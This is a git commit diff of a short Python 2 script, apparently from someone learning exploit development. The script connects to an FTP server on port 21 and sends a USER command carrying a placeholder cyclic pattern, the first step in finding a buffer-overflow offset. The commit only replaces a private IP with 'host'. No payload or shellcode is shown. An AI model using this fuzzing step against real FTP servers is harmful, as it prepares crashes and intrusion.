ede4c3d8ac616c5482dfc0193a54bc197acec3b7
zHeadCrusher <67909733+zHeadCrusher@users.noreply.github.com>
2020-08-21 12:40:28 -0300

    Update 1pattern.py

--- FTP Server/1pattern.py
+++ FTP Server/1pattern.py
@@ -3,7 +3,7 @@ import socket
 bytes = ("valor do pattern create aqui")
 try:
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.connect(("192.168.2.140",21))
+	s.connect(("host",21))
 	s.recv(1024)
 	s.send("USER "+bytes+"\r\n")
 	print r
